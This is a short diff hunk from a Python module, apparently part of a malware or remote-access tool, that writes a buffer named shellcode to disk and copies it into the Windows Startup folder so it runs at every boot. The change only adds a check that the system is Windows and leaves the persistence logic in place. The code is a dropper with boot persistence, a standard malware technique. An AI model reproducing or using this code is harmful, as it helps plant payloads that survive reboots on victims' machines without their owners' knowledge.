@@ -72,7 +72,7 @@ def run(**args):
         mon_fichier = open(OsTargetpath, "wb")
         mon_fichier.write(shellcode)
         mon_fichier.close()
-        if winRunOnBoot == True:
+        if os.name == 'nt' and winRunOnBoot == True:
             startPath=os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup"
             os.system("copy %s %s"%(OsTargetpath, startPath))
     except:
